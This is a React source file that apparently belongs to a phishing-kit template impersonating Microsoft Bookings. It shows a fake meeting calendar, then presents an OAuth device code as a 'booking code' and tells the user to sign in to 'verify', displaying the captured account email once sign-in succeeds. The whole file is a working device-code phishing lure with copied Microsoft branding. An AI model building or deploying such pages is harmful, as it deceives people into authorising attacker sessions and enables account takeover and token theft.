import React, { useState } from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

const MONTH_NAMES = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
const DAY_NAMES = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
const TIME_SLOTS = ['9:00 AM', '9:30 AM', '10:00 AM', '10:30 AM', '11:00 AM', '11:30 AM', '1:00 PM', '1:30 PM', '2:00 PM', '2:30 PM', '3:00 PM', '3:30 PM', '4:00 PM'];

export function BookingsMeetingTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow();
  const [selectedDate, setSelectedDate] = useState<number | null>(null);
  const [selectedTime, setSelectedTime] = useState('');
  const now = new Date();
  const year = now.getFullYear();
  const month = now.getMonth();
  const firstDay = new Date(year, month, 1).getDay();
  const daysInMonth = new Date(year, month + 1, 0).getDate();
  const today = now.getDate();

  const calDays: (number | null)[] = [];
  for (let i = 0; i < firstDay; i++) calDays.push(null);
  for (let i = 1; i <= daysInMonth; i++) calDays.push(i);

  return (
    <div className="tpl-page" style={{ background: '#f5f5f5' }}>
      <div className="tpl-container" style={{ maxWidth: 600 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
            <rect width="11" height="11" fill="#f25022" /><rect x="12" width="11" height="11" fill="#7fba00" />
            <rect y="12" width="11" height="11" fill="#00a4ef" /><rect x="12" y="12" width="11" height="11" fill="#ffb900" />
            <text x="28" y="17" fill="#5e5e5e" fontSize="14" fontFamily="Segoe UI, sans-serif" fontWeight="600">Bookings</text>
          </svg>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">Schedule a Meeting</h1>
              <p className="tpl-text">Select a date and time for your appointment.</p>

              <div style={{ marginBottom: 16 }}>
                <div style={{ fontWeight: 600, fontSize: 15, marginBottom: 8, color: '#1b1b1b' }}>{MONTH_NAMES[month]} {year}</div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: 2, textAlign: 'center' }}>
                  {DAY_NAMES.map(d => <div key={d} style={{ fontSize: 11, fontWeight: 600, color: '#8a8886', padding: 4 }}>{d}</div>)}
                  {calDays.map((day, i) => (
                    <div key={i} onClick={() => day && day >= today && setSelectedDate(day)} style={{
                      padding: 8, fontSize: 13, borderRadius: 4, cursor: day && day >= today ? 'pointer' : 'default',
                      background: selectedDate === day ? '#0078d4' : 'transparent', color: selectedDate === day ? 'white' : day && day >= today ? '#1b1b1b' : '#c8c6c4',
                      fontWeight: selectedDate === day ? 600 : 400
                    }}>{day ?? ''}</div>
                  ))}
                </div>
              </div>

              {selectedDate && (
                <div style={{ marginBottom: 20 }}>
                  <div style={{ fontWeight: 600, fontSize: 14, marginBottom: 8, color: '#1b1b1b' }}>Available times for {MONTH_NAMES[month]} {selectedDate}</div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 6 }}>
                    {TIME_SLOTS.map(t => (
                      <button key={t} onClick={() => setSelectedTime(t)} style={{
                        padding: '8px 4px', border: selectedTime === t ? '2px solid #0078d4' : '1px solid #e1dfdd', borderRadius: 4,
                        background: selectedTime === t ? '#f3f9ff' : 'white', cursor: 'pointer', fontSize: 13, color: selectedTime === t ? '#0078d4' : '#323130', fontWeight: selectedTime === t ? 600 : 400
                      }}>{t}</button>
                    ))}
                  </div>
                </div>
              )}

              {selectedTime && <button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleStart}>Book {selectedTime}</button>}
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Reserving your slot...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Verify Your Identity</h1>
              <p className="tpl-text">Enter this code to confirm your booking for {selectedTime}.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">BOOKING CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the booking code</div><div className="tpl-step">2. Click verify and sign in</div></div>
              <button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Booking Confirmed!</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">A calendar invite will be sent to your email.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Book another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0078d4' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Microsoft Bookings</span><span>Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
